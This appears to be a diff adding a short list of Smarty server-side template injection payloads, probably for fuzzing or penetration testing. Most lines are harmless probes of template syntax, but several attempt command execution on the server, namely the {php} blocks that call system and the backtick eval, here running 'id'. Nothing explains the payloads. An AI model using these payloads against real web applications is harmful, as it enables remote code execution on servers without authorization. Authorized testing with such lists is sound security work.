@@ -1,0 +1,15 @@
+{php}echo `id`;{/php}
+{$smarty.version}
+{$smarty.server.SERVER_NAME}
+{assign var='foo' value='bar'}{$foo}
+{if 1==1}True{/if}
+{foreach $array as $value}{$value}{/foreach}
+{include file='config.php'}
+{eval var='echo "Hello World";'}
+{capture name='foo'}Hello{/capture}{$smarty.capture.foo}
+{config_load file='config.conf'}
+{section name=foo loop=5}{$smarty.section.foo.index}{/section}
+{literal}This is literal text{/literal}
+{* This is a comment *}
+{assign var='cmd' value='id'}{php}system($cmd);{/php}
+{assign var='cmd' value='id'}{eval var='`$cmd`'}
